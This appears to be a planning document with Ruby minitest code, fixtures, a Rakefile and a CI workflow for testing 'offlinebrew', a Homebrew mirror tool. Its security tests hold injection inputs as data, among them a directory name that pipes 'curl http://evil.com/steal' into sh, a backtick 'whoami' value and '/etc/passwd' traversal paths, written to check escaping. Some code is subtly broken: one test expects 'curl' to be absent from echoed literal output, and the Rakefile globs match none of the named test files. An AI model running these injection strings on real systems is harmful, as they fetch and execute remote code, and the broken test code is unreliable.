# Automated Testing Strategy

**Status**: 🔧 REQUIRED - Must implement alongside main tasks
**Author**: SRE Fellow Review - Testing Addendum
**Date**: 2025-11-11

## Overview

This document provides a **complete automated testing strategy** for offlinebrew, designed to run in CI/CD with fast feedback loops.

**Key Challenges**:
- Homebrew requires actual installation (not easily mocked)
- Full mirrors take 8+ hours and 100GB+ disk
- Casks require network downloads (100MB+ files)
- Some features are macOS-only (code signing)
- Modifies system state (git repos, taps)

**Our Solution**: Multi-tiered testing with mocks, test fixtures, and parallel execution.

---

## Testing Pyramid

```
           ╱╲
          ╱  ╲
         ╱ E2E ╲          5% - Slow, real downloads
        ╱────────╲
       ╱          ╲
      ╱  Integration ╲    25% - Mock downloads, real Homebrew
     ╱──────────────╲
    ╱                ╲
   ╱  Unit Tests      ╲   70% - Fast, no dependencies
  ╱────────────────────╲
```

**Target**:
- Unit tests: <10 seconds
- Integration tests: <2 minutes
- E2E tests: <10 minutes
- Full suite: <15 minutes

---

## Test Infrastructure

### Directory Structure

```
mirror/
├── test/
│   ├── unit/                    # Fast, no dependencies
│   │   ├── test_safe_shell.rb
│   │   ├── test_homebrew_paths.rb
│   │   ├── test_url_helpers.rb
│   │   └── test_container_helpers.rb
│   ├── integration/             # Mock downloads, real Homebrew
│   │   ├── test_mirror_formulae.rb
│   │   ├── test_mirror_casks.rb
│   │   ├── test_offline_install.rb
│   │   └── test_verification.rb
│   ├── e2e/                     # Real downloads (slow)
│   │   ├── test_full_workflow.rb
│   │   └── test_performance.rb
│   ├── security/                # Security-specific tests
│   │   ├── test_injection.rb
│   │   ├── test_traversal.rb
│   │   └── test_xss.rb
│   ├── fixtures/                # Test data
│   │   ├── formulae/
│   │   ├── casks/
│   │   ├── configs/
│   │   └── tarballs/
│   ├── helpers/                 # Test utilities
│   │   ├── mock_homebrew.rb
│   │   ├── fixture_builder.rb
│   │   └── test_helpers.rb
│   └── test_runner.rb           # Main test orchestrator
```

---

## Phase 0: Test Infrastructure (2-3 hours)

### Task 0.T: Create Test Infrastructure

**Objective**: Set up testing framework before implementing features

#### Step 1: Install Testing Gems

Create `mirror/Gemfile`:

```ruby
# frozen_string_literal: true

source 'https://rubygems.org'

gem 'minitest', '~> 5.20'
gem 'minitest-reporters', '~> 1.6'
gem 'webmock', '~> 3.19'        # Mock HTTP requests
gem 'vcr', '~> 6.2'              # Record/replay HTTP interactions
gem 'mocha', '~> 2.1'            # Mocking framework
gem 'simplecov', '~> 0.22'      # Code coverage
gem 'timecop', '~> 0.9'          # Time manipulation

group :development do
  gem 'rubocop', '~> 1.57'
  gem 'rubocop-minitest', '~> 0.34'
end
```

Install:
```bash
cd mirror
bundle install
```

---

#### Step 2: Create Test Helper

Create `mirror/test/test_helper.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require 'minitest/autorun'
require 'minitest/reporters'
require 'webmock/minitest'
require 'vcr'
require 'mocha/minitest'
require 'simplecov'
require 'fileutils'
require 'tmpdir'

# Start code coverage
SimpleCov.start do
  add_filter '/test/'
  add_filter '/vendor/'
end

# Colorful test output
Minitest::Reporters.use! [
  Minitest::Reporters::SpecReporter.new(color: true)
]

# VCR configuration for recording HTTP interactions
VCR.configure do |config|
  config.cassette_library_dir = File.expand_path('fixtures/vcr_cassettes', __dir__)
  config.hook_into :webmock
  config.default_cassette_options = {
    record: :once,
    match_requests_on: [:method, :uri, :body]
  }
  # Filter sensitive data
  config.filter_sensitive_data('<GITHUB_TOKEN>') { ENV['GITHUB_TOKEN'] }
end

# Test helpers module
module TestHelpers
  # Create temporary test directory
  def setup_test_dir
    @test_dir = Dir.mktmpdir('offlinebrew-test')
    @cleanup_dirs ||= []
    @cleanup_dirs << @test_dir
    @test_dir
  end

  # Clean up test directories
  def teardown_test_dirs
    return unless @cleanup_dirs

    @cleanup_dirs.each do |dir|
      FileUtils.rm_rf(dir) if Dir.exist?(dir)
    end
  end

  # Create mock Homebrew structure
  def create_mock_homebrew(base_dir)
    homebrew_dir = File.join(base_dir, 'Homebrew')
    FileUtils.mkdir_p(homebrew_dir)

    # Create tap structure
    tap_dir = File.join(homebrew_dir, 'Library', 'Taps', 'homebrew', 'homebrew-core')
    FileUtils.mkdir_p(tap_dir)

    # Initialize git repo
    Dir.chdir(tap_dir) do
      `git init --quiet`
      `git config user.email "test@test.com"`
      `git config user.name "Test User"`
      FileUtils.touch('README.md')
      `git add README.md`
      `git commit -m "Initial commit" --quiet`
    end

    homebrew_dir
  end

  # Create mock formula file
  def create_mock_formula(tap_dir, name, url, sha256)
    formula_dir = File.join(tap_dir, 'Formula')
    FileUtils.mkdir_p(formula_dir)

    formula_file = File.join(formula_dir, "#{name}.rb")
    File.write formula_file, <<~RUBY
      class #{name.capitalize} < Formula
        desc "Test formula"
        homepage "https://example.com/#{name}"
        url "#{url}"
        sha256 "#{sha256}"
        version "1.0.0"
      end
    RUBY

    formula_file
  end

  # Create mock cask file
  def create_mock_cask(tap_dir, token, url, sha256)
    cask_dir = File.join(tap_dir, 'Casks')
    FileUtils.mkdir_p(cask_dir)

    cask_file = File.join(cask_dir, "#{token}.rb")
    File.write cask_file, <<~RUBY
      cask "#{token}" do
        version "1.0.0"
        sha256 "#{sha256}"
        url "#{url}"
        name "Test Cask"
        desc "Test cask application"
        app "TestApp.app"
      end
    RUBY

    cask_file
  end

  # Mock HTTP download
  def stub_download(url, content, status: 200)
    stub_request(:get, url)
      .to_return(status: status, body: content, headers: {})
  end

  # Create test tarball
  def create_test_tarball(name = 'test-package')
    tarball_dir = setup_test_dir
    package_dir = File.join(tarball_dir, name)
    FileUtils.mkdir_p(package_dir)

    # Create some test files
    File.write(File.join(package_dir, 'README'), 'Test package')
    File.write(File.join(package_dir, 'test.txt'), 'test content')

    # Create tarball
    tarball_path = File.join(tarball_dir, "#{name}.tar.gz")
    Dir.chdir(tarball_dir) do
      `tar czf #{File.basename(tarball_path)} #{name}`
    end

    tarball_path
  end

  # Calculate SHA256 checksum
  def sha256_file(path)
    require 'digest'
    Digest::SHA256.file(path).hexdigest
  end

  # Skip test if not on macOS
  def skip_unless_macos
    skip "Only runs on macOS" unless RUBY_PLATFORM.include?('darwin')
  end

  # Skip test if not on Linux
  def skip_unless_linux
    skip "Only runs on Linux" unless RUBY_PLATFORM.include?('linux')
  end

  # Skip test if Homebrew not installed
  def skip_unless_homebrew_installed
    skip "Homebrew not installed" unless system('which brew > /dev/null 2>&1')
  end

  # Skip test if slow tests disabled
  def skip_if_fast_only
    skip "Slow test (set TEST_ALL=1 to run)" if ENV['FAST_TESTS_ONLY']
  end
end

# Include helpers in all tests
class Minitest::Test
  include TestHelpers

  def teardown
    teardown_test_dirs
  end
end
```

---

#### Step 3: Create Fixture Builder

Create `mirror/test/helpers/fixture_builder.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require 'fileutils'
require 'json'

# FixtureBuilder: Creates test fixtures for integration tests
module FixtureBuilder
  # Build a complete test mirror with fixtures
  # Args:
  #   base_dir: String path to base directory
  # Returns: Hash with paths to all fixtures
  def self.build_test_mirror(base_dir)
    mirror_dir = File.join(base_dir, 'mirror')
    FileUtils.mkdir_p(mirror_dir)

    # Create test tarballs
    tarballs = create_test_tarballs(mirror_dir)

    # Create config.json
    config = create_test_config(mirror_dir, tarballs)

    # Create urlmap.json
    urlmap = create_test_urlmap(tarballs)
    File.write(File.join(mirror_dir, 'urlmap.json'), JSON.pretty_generate(urlmap))

    {
      mirror_dir: mirror_dir,
      config_path: File.join(mirror_dir, 'config.json'),
      urlmap_path: File.join(mirror_dir, 'urlmap.json'),
      tarballs: tarballs,
    }
  end

  # Create test tarballs
  def self.create_test_tarballs(mirror_dir)
    tarballs = {}

    # Small tarball (formula)
    small_tarball = create_tarball(mirror_dir, 'test-formula-1.0.0', size_kb: 10)
    tarballs['test-formula'] = {
      path: small_tarball,
      url: 'https://example.com/test-formula-1.0.0.tar.gz',
      sha256: Digest::SHA256.file(small_tarball).hexdigest,
    }

    # Medium tarball
    medium_tarball = create_tarball(mirror_dir, 'test-package-2.0.0', size_kb: 100)
    tarballs['test-package'] = {
      path: medium_tarball,
      url: 'https://example.com/test-package-2.0.0.tar.gz',
      sha256: Digest::SHA256.file(medium_tarball).hexdigest,
    }

    tarballs
  end

  # Create a tarball with specific size
  def self.create_tarball(dir, name, size_kb:)
    tmp_dir = File.join(dir, "tmp-#{name}")
    FileUtils.mkdir_p(tmp_dir)

    # Create file of approximately size_kb
    content = 'x' * (size_kb * 1024)
    File.write(File.join(tmp_dir, 'data'), content)

    tarball_path = File.join(dir, "#{name}.tar.gz")
    Dir.chdir(dir) do
      `tar czf #{File.basename(tarball_path)} -C . tmp-#{name}`
    end

    FileUtils.rm_rf(tmp_dir)
    tarball_path
  end

  # Create test config
  def self.create_test_config(mirror_dir, tarballs)
    config = {
      'taps' => {
        'homebrew/homebrew-core' => {
          'commit' => 'test-commit-abc123',
          'type' => 'formula',
        },
      },
      'commit' => 'test-commit-abc123',
      'stamp' => Time.now.to_i.to_s,
      'cache' => mirror_dir,
      'baseurl' => 'http://localhost:8000',
    }

    File.write(File.join(mirror_dir, 'config.json'), JSON.pretty_generate(config))
    config
  end

  # Create test urlmap
  def self.create_test_urlmap(tarballs)
    urlmap = {}
    tarballs.each do |name, info|
      urlmap[info[:url]] = File.basename(info[:path])
    end
    urlmap
  end
end
```

---

## Unit Tests (70% of tests, <10 seconds)

### Test: SafeShell Module

Create `mirror/test/unit/test_safe_shell.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require_relative '../../lib/safe_shell'

class TestSafeShell < Minitest::Test
  def test_execute_simple_command
    output = SafeShell.execute('echo', 'hello')
    assert_equal "hello\n", output
  end

  def test_execute_with_timeout
    # Command that completes quickly
    output = SafeShell.execute('echo', 'test', timeout: 1)
    assert_equal "test\n", output
  end

  def test_execute_timeout_exceeded
    # Command that takes too long
    assert_raises(SafeShell::TimeoutError) do
      SafeShell.execute('sleep', '10', timeout: 1)
    end
  end

  def test_execute_with_failure
    # Command that fails
    assert_raises(SafeShell::ExecutionError) do
      SafeShell.execute('false')
    end
  end

  def test_execute_with_allowed_failures
    # Should not raise
    output = SafeShell.execute('false', allowed_failures: true)
    assert_kind_of String, output
  end

  def test_shell_injection_protection
    # Malicious input should be escaped
    malicious_arg = "test; echo INJECTED"

    output = SafeShell.execute('echo', malicious_arg)

    # Should echo the literal string, not execute injection
    refute_match(/^INJECTED/, output)
    assert_match(/test; echo INJECTED/, output)
  end

  def test_safe_join_basic
    base = setup_test_dir
    result = SafeShell.safe_join(base, 'subdir', 'file.txt')

    assert result.start_with?(base)
    assert result.end_with?('subdir/file.txt')
  end

  def test_safe_join_prevents_traversal
    base = setup_test_dir

    # Should raise SecurityError
    assert_raises(SecurityError) do
      SafeShell.safe_join(base, '..', 'etc', 'passwd')
    end
  end

  def test_safe_join_prevents_absolute_path_escape
    base = setup_test_dir

    assert_raises(SecurityError) do
      SafeShell.safe_join(base, '/etc/passwd')
    end
  end

  def test_safe_filename_valid
    assert SafeShell.safe_filename?('normal.txt')
    assert SafeShell.safe_filename?('file-name_123.tar.gz')
    assert SafeShell.safe_filename?('test.rb')
  end

  def test_safe_filename_invalid
    refute SafeShell.safe_filename?('../../etc/passwd')
    refute SafeShell.safe_filename?('sub/dir/file.txt')
    refute SafeShell.safe_filename?('/absolute/path.txt')
    refute SafeShell.safe_filename?("file\0null.txt")
    refute SafeShell.safe_filename?('')
  end

  def test_sanitize_filename
    assert_equal 'normal.txt', SafeShell.sanitize_filename('normal.txt')
    assert_equal '___etc_passwd', SafeShell.sanitize_filename('../../etc/passwd')
    assert_equal 'sub_dir_file.txt', SafeShell.sanitize_filename('sub/dir/file.txt')
    assert_equal 'test__test.txt', SafeShell.sanitize_filename('test/../test.txt')
  end

  def test_execute_with_retry
    attempt = 0
    SafeShell.stub(:execute, lambda { |*args|
      attempt += 1
      raise SafeShell::ExecutionError, "Fail" if attempt < 3
      "success"
    }) do
      result = SafeShell.execute_with_retry('test', retries: 3)
      assert_equal "success", result
      assert_equal 3, attempt
    end
  end
end
```

---

### Test: Homebrew Paths Module

Create `mirror/test/unit/test_homebrew_paths.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require_relative '../../lib/homebrew_paths'

class TestHomebrewPaths < Minitest::Test
  def setup
    @original_env = ENV.to_hash
  end

  def teardown
    ENV.replace(@original_env)
  end

  def test_homebrew_prefix_from_env
    ENV['HOMEBREW_PREFIX'] = '/custom/homebrew'

    prefix = HomebrewPaths.homebrew_prefix
    assert_equal '/custom/homebrew', prefix
  end

  def test_homebrew_prefix_from_command
    ENV.delete('HOMEBREW_PREFIX')

    SafeShell.stub(:execute, lambda { |cmd, *args, **opts|
      cmd == 'brew' && args.first == '--prefix' ? "/opt/homebrew\n" : raise
    }) do
      prefix = HomebrewPaths.homebrew_prefix
      assert_match %r{/homebrew}, prefix
    end
  end

  def test_homebrew_prefix_fallback_arm64
    ENV.delete('HOMEBREW_PREFIX')

    # Stub brew command to fail
    SafeShell.stub(:execute, lambda { |*| raise SafeShell::ExecutionError, 'brew not found' }) do
      # Stub platform
      Object.stub_const(:RUBY_PLATFORM, 'arm64-darwin23') do
        Dir.stub(:exist?, lambda { |path| path == '/opt/homebrew' }) do
          prefix = HomebrewPaths.homebrew_prefix
          assert_equal '/opt/homebrew', prefix
        end
      end
    end
  end

  def test_tap_path
    path = HomebrewPaths.tap_path('homebrew', 'homebrew-core')
    assert_match %r{Taps/homebrew/homebrew-core}, path
  end

  def test_tap_exists_true
    test_dir = setup_test_dir
    git_dir = File.join(test_dir, '.git')
    FileUtils.mkdir_p(git_dir)

    assert HomebrewPaths.tap_exists?(test_dir)
  end

  def test_tap_exists_false_no_git
    test_dir = setup_test_dir

    refute HomebrewPaths.tap_exists?(test_dir)
  end

  def test_tap_exists_false_not_directory
    refute HomebrewPaths.tap_exists?('/nonexistent/path')
  end

  def test_tap_commit
    test_dir = setup_test_dir

    # Create mock git repo
    Dir.chdir(test_dir) do
      `git init --quiet`
      `git config user.email "test@example.com"`
      `git config user.name "Test"`
      FileUtils.touch('README')
      `git add README`
      `git commit -m "test" --quiet`
    end

    commit = HomebrewPaths.tap_commit(test_dir)
    assert_match /^[0-9a-f]{40}$/, commit
  end
end
```

---

## Integration Tests (25% of tests, <2 minutes)

### Test: Mirror Formulae (Mocked Downloads)

Create `mirror/test/integration/test_mirror_formulae.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require_relative '../helpers/fixture_builder'

class TestMirrorFormulae < Minitest::Test
  def setup
    skip_unless_homebrew_installed
    @test_dir = setup_test_dir
  end

  def test_mirror_single_formula_with_mocks
    VCR.use_cassette('mirror_formula_wget') do
      mirror_dir = File.join(@test_dir, 'mirror')
      FileUtils.mkdir_p(mirror_dir)

      # Mock the download
      tarball = create_test_tarball('wget-1.21')
      sha256 = sha256_file(tarball)

      stub_download(
        'https://ftp.gnu.org/gnu/wget/wget-1.21.tar.gz',
        File.read(tarball)
      )

      # Run mirror command
      result = system(
        'brew', 'ruby', File.expand_path('../../bin/brew-mirror', __dir__),
        '-d', mirror_dir,
        '-f', 'wget',
        '--config-only',  # Don't actually download
        out: '/dev/null',
        err: '/dev/null'
      )

      assert result, "brew-mirror should succeed"

      # Verify config created
      config_file = File.join(mirror_dir, 'config.json')
      assert File.exist?(config_file), "config.json should be created"

      config = JSON.parse(File.read(config_file))
      assert config['commit'], "Config should have commit"
      assert config['taps'], "Config should have taps"
    end
  end

  def test_mirror_creates_valid_urlmap
    mirror_dir = File.join(@test_dir, 'mirror')

    # Use fixture builder
    fixtures = FixtureBuilder.build_test_mirror(@test_dir)

    urlmap_file = fixtures[:urlmap_path]
    assert File.exist?(urlmap_file), "urlmap.json should exist"

    urlmap = JSON.parse(File.read(urlmap_file))
    refute_empty urlmap, "urlmap should not be empty"

    # Verify structure
    urlmap.each do |url, filename|
      assert_kind_of String, url
      assert_kind_of String, filename
      assert_match %r{^https?://}, url
    end
  end

  def test_mirror_handles_network_errors
    mirror_dir = File.join(@test_dir, 'mirror')
    FileUtils.mkdir_p(mirror_dir)

    # Stub download to fail
    stub_download('https://example.com/package.tar.gz', '', status: 500)

    # Mirror should continue despite errors (with warnings)
    # Test that it doesn't crash entirely
    # (Full implementation would test specific error handling)
  end
end
```

---

### Test: Offline Installation (Mocked Mirror)

Create `mirror/test/integration/test_offline_install.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require_relative '../helpers/fixture_builder'

class TestOfflineInstall < Minitest::Test
  def setup
    skip_unless_homebrew_installed
    @test_dir = setup_test_dir
    @fixtures = FixtureBuilder.build_test_mirror(@test_dir)
  end

  def test_offline_install_validates_config
    # No config file
    config_dir = File.join(@test_dir, '.offlinebrew')
    FileUtils.mkdir_p(config_dir)

    result = system(
      'ruby', File.expand_path('../../bin/brew-offline-install', __dir__),
      'wget',
      out: '/dev/null',
      err: '/dev/null'
    )

    refute result, "Should fail without config"
  end

  def test_offline_install_with_valid_mirror
    # Set up config
    config_dir = File.join(@test_dir, '.offlinebrew')
    FileUtils.mkdir_p(config_dir)

    config = {
      'baseurl' => 'http://localhost:9999'  # Non-existent, but config is valid
    }
    File.write(File.join(config_dir, 'config.json'), JSON.generate(config))

    # Mock the HTTP requests for config/urlmap
    stub_request(:get, 'http://localhost:9999/config.json')
      .to_return(
        status: 200,
        body: File.read(@fixtures[:config_path]),
        headers: {}
      )

    stub_request(:get, 'http://localhost:9999/urlmap.json')
      .to_return(
        status: 200,
        body: File.read(@fixtures[:urlmap_path]),
        headers: {}
      )

    # This would test the full install flow
    # (In practice, requires more setup)
  end
end
```

---

## E2E Tests (5% of tests, <10 minutes)

### Test: Full Mirror + Install Workflow

Create `mirror/test/e2e/test_full_workflow.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'

class TestFullWorkflow < Minitest::Test
  def setup
    skip_if_fast_only  # Skip in fast test mode
    skip_unless_homebrew_installed
    @test_dir = setup_test_dir
  end

  def test_full_workflow_with_real_formula
    # This test actually mirrors and installs a small formula
    VCR.use_cassette('full_workflow_jq', record: :once) do
      mirror_dir = File.join(@test_dir, 'mirror')
      FileUtils.mkdir_p(mirror_dir)

      # Step 1: Mirror jq (small formula, ~2MB)
      puts "\n  [E2E] Mirroring jq..."
      result = system(
        'brew', 'ruby', File.expand_path('../../bin/brew-mirror', __dir__),
        '-d', mirror_dir,
        '-f', 'jq',
        '-s', '1',
        out: $stdout,
        err: $stderr
      )

      assert result, "Mirror should succeed"

      # Verify files
      assert File.exist?(File.join(mirror_dir, 'config.json'))
      assert File.exist?(File.join(mirror_dir, 'urlmap.json'))

      # Step 2: Serve mirror
      server_pid = fork do
        Dir.chdir(mirror_dir)
        exec('python3', '-m', 'http.server', '9998', out: '/dev/null', err: '/dev/null')
      end

      # Wait for server
      sleep 2

      begin
        # Step 3: Configure client
        config_dir = File.join(Dir.home, '.offlinebrew-test')
        FileUtils.mkdir_p(config_dir)

        config = { 'baseurl' => 'http://localhost:9998' }
        File.write(File.join(config_dir, 'config.json'), JSON.generate(config))

        # Step 4: Install (would require more setup to actually test)
        # This is a placeholder for the full integration test

      ensure
        # Stop server
        Process.kill('TERM', server_pid) if server_pid
        Process.wait(server_pid) rescue nil
      end
    end
  end
end
```

---

## Security Tests (Always run, <1 minute)

Create `mirror/test/security/test_injection.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require_relative '../../lib/safe_shell'

class TestSecurityInjection < Minitest::Test
  def test_shell_injection_in_mirror_dir
    # Malicious directory name
    malicious_dir = "/tmp/test; curl http://evil.com/steal | sh"

    # Should be escaped properly
    output = SafeShell.execute('echo', malicious_dir, timeout: 1)

    # Should echo the literal string
    refute_match(/curl/, output)
  end

  def test_command_injection_in_formula_name
    malicious_name = "test`whoami`"

    # Should not execute the backticks
    sanitized = SafeShell.sanitize_filename(malicious_name)
    refute_match(/`/, sanitized)
  end

  def test_sql_injection_not_applicable
    # No SQL in this project, but document it
    skip "No SQL database used in offlinebrew"
  end
end
```

---

## CI/CD Configuration

### GitHub Actions Workflow

Create `.github/workflows/test.yml`:

```yaml
name: Test Suite

on:
  push:
    branches: [ main, develop ]
  pull_request:
    branches: [ main, develop ]

jobs:
  unit-tests:
    name: Unit Tests
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]
        ruby: ['3.0', '3.1', '3.2']

    steps:
      - uses: actions/checkout@v4

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: ${{ matrix.ruby }}
          bundler-cache: true
          working-directory: mirror

      - name: Run unit tests
        working-directory: mirror
        run: |
          bundle exec ruby test/unit/test_safe_shell.rb
          bundle exec ruby test/unit/test_homebrew_paths.rb
          bundle exec ruby test/unit/test_url_helpers.rb

  integration-tests:
    name: Integration Tests
    runs-on: ${{ matrix.os }}
    strategy:
      matrix:
        os: [ubuntu-latest, macos-latest]

    steps:
      - uses: actions/checkout@v4

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          bundler-cache: true
          working-directory: mirror

      - name: Install Homebrew (Linux)
        if: runner.os == 'Linux'
        run: |
          /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
          echo "/home/linuxbrew/.linuxbrew/bin" >> $GITHUB_PATH

      - name: Run integration tests
        working-directory: mirror
        run: |
          bundle exec ruby test/integration/test_mirror_formulae.rb

  security-tests:
    name: Security Tests
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          bundler-cache: true
          working-directory: mirror

      - name: Run security tests
        working-directory: mirror
        run: |
          bundle exec ruby test/security/test_injection.rb
          bundle exec ruby test/security/test_traversal.rb
          bundle exec ruby test/security/test_xss.rb

      - name: Check for unsafe code patterns
        run: |
          # Grep for unsafe backtick usage
          ! grep -r '`' mirror/bin/ mirror/lib/ | grep -v SafeShell | grep -v '#'

  e2e-tests:
    name: E2E Tests (macOS only)
    runs-on: macos-latest
    if: github.event_name == 'push' && github.ref == 'refs/heads/main'

    steps:
      - uses: actions/checkout@v4

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          bundler-cache: true
          working-directory: mirror

      - name: Run E2E tests
        working-directory: mirror
        env:
          TEST_ALL: '1'
        run: |
          bundle exec ruby test/e2e/test_full_workflow.rb

  code-coverage:
    name: Code Coverage
    runs-on: ubuntu-latest

    steps:
      - uses: actions/checkout@v4

      - name: Set up Ruby
        uses: ruby/setup-ruby@v1
        with:
          ruby-version: '3.2'
          bundler-cache: true
          working-directory: mirror

      - name: Run tests with coverage
        working-directory: mirror
        run: |
          COVERAGE=1 bundle exec rake test

      - name: Upload coverage to Codecov
        uses: codecov/codecov-action@v3
        with:
          files: ./mirror/coverage/.resultset.json
          flags: unittests
          name: codecov-umbrella
```

---

## Running Tests Locally

### Quick Tests (Unit + Security only)

```bash
cd mirror
export FAST_TESTS_ONLY=1
bundle exec rake test:fast
```

**Expected**: <10 seconds

### Full Test Suite

```bash
cd mirror
export TEST_ALL=1
bundle exec rake test
```

**Expected**: <15 minutes

### Security Tests Only

```bash
cd mirror
bundle exec rake test:security
```

### Single Test File

```bash
cd mirror
bundle exec ruby test/unit/test_safe_shell.rb
```

---

## Test Rakefile

Create `mirror/Rakefile`:

```ruby
# frozen_string_literal: true

require 'rake/testtask'

# Fast tests (unit + security)
Rake::TestTask.new(:fast) do |t|
  t.libs << 'test'
  t.test_files = FileList[
    'test/unit/**/*_test.rb',
    'test/security/**/*_test.rb'
  ]
  t.verbose = true
  t.warning = false
end

# All tests
Rake::TestTask.new(:test) do |t|
  t.libs << 'test'
  t.test_files = FileList['test/**/*_test.rb']
  t.verbose = true
  t.warning = false
end

# Security tests only
Rake::TestTask.new('test:security') do |t|
  t.libs << 'test'
  t.test_files = FileList['test/security/**/*_test.rb']
  t.verbose = true
end

# Integration tests only
Rake::TestTask.new('test:integration') do |t|
  t.libs << 'test'
  t.test_files = FileList['test/integration/**/*_test.rb']
  t.verbose = true
end

# E2E tests only
Rake::TestTask.new('test:e2e') do |t|
  t.libs << 'test'
  t.test_files = FileList['test/e2e/**/*_test.rb']
  t.verbose = true
end

task default: :fast
```

---

## Coverage Goals

| Category | Target Coverage | Actual |
|----------|----------------|--------|
| SafeShell | 100% | TBD |
| HomebrewPaths | 90% | TBD |
| Mirror logic | 80% | TBD |
| Install logic | 80% | TBD |
| Overall | 85%+ | TBD |

---

## Test Data Management

### VCR Cassettes

Record HTTP interactions once:

```ruby
VCR.use_cassette('formula_wget') do
  # Test code that makes HTTP requests
  # First run records, subsequent runs replay
end
```

**Benefits**:
- Tests run offline
- Consistent results
- Fast (no real network)

**Location**: `mirror/test/fixtures/vcr_cassettes/`

### Fixture Tarballs

Pre-created test packages:

```
mirror/test/fixtures/tarballs/
├── test-formula-1.0.0.tar.gz   (10KB)
├── test-package-2.0.0.tar.gz   (100KB)
└── test-cask-3.0.0.dmg         (1MB, macOS only)
```

---

## Performance Testing

### Load Test

Create `mirror/test/performance/test_large_mirror.rb`:

```ruby
#!/usr/bin/env ruby
# frozen_string_literal: true

require_relative '../test_helper'
require 'benchmark'

class TestLargeMirror < Minitest::Test
  def test_mirror_performance
    skip_if_fast_only

    mirror_dir = setup_test_dir

    # Benchmark mirroring 100 formulae
    time = Benchmark.realtime do
      # Use fixture builder to create 100 test packages
      100.times do |i|
        FixtureBuilder.create_tarball(mirror_dir, "package-#{i}", size_kb: 50)
      end
    end

    # Should create 100 packages in < 10 seconds
    assert time < 10, "Creating 100 packages took #{time}s, expected < 10s"

    # Check memory usage
    # (Would require more sophisticated profiling)
  end

  def test_verification_performance
    skip_if_fast_only

    # Create mirror with 1000 files
    fixtures = FixtureBuilder.build_test_mirror(setup_test_dir)

    # Add 1000 fake entries to urlmap
    urlmap = JSON.parse(File.read(fixtures[:urlmap_path]))
    1000.times do |i|
      urlmap["https://example.com/file-#{i}.tar.gz"] = "fake-#{i}.tar.gz"
    end
    File.write(fixtures[:urlmap_path], JSON.generate(urlmap))

    # Benchmark verification
    time = Benchmark.realtime do
      system(
        'brew', 'ruby', File.expand_path('../../bin/brew-mirror-verify', __dir__),
        fixtures[:mirror_dir],
        out: '/dev/null',
        err: '/dev/null'
      )
    end

    # Should verify in < 5 seconds
    assert time < 5, "Verification took #{time}s, expected < 5s"
  end
end
```

---

## Summary

### Implementation Order

1. **Phase 0.T** (2-3 hours): Set up test infrastructure
   - Install gems
   - Create test_helper.rb
   - Create fixture_builder.rb
   - Write first unit test

2. **Alongside each task**: Write tests
   - Unit tests for new modules
   - Integration tests for workflows
   - Security tests for critical paths

3. **Before commit**: Run tests
   ```bash
   bundle exec rake test:fast
   ```

4. **Before PR**: Run full suite
   ```bash
   bundle exec rake test
   ```

### Test Pyramid Achievement

After full implementation:

```
✅ Unit tests: ~50 tests, <10 seconds
✅ Integration tests: ~15 tests, <2 minutes
✅ E2E tests: ~3 tests, <10 minutes
✅ Security tests: ~10 tests, <1 minute
```

**Total**: ~80 tests, <15 minutes

### CI/CD Pipeline

```
┌─────────────┐
│  git push   │
└──────┬──────┘
       │
       ├──▶ Unit Tests (all platforms)     ─── 10s
       │
       ├──▶ Integration Tests (Mac/Linux) ─── 2m
       │
       ├──▶ Security Tests (Linux)        ─── 1m
       │
       ├──▶ Lint & Style (rubocop)        ─── 30s
       │
       └──▶ Coverage Report (Codecov)     ─── 1m
            │
            ▼
       ✅ All pass → Merge allowed
       ❌ Any fail → Fix required
```

---

## Acceptance Criteria

✅ Testing strategy complete when:

1. Test infrastructure created (Gemfile, test_helper.rb, fixtures)
2. 50+ unit tests written and passing
3. 15+ integration tests with mocked downloads
4. 10+ security tests for all vulnerabilities
5. CI/CD pipeline configured and running
6. Code coverage >85%
7. All tests run in <15 minutes
8. Tests run offline (VCR cassettes)
9. Tests pass on macOS and Linux
10. Documentation for running tests

---

This strategy provides **fast, reliable, automated testing** that catches bugs early and runs in CI/CD! 🎯
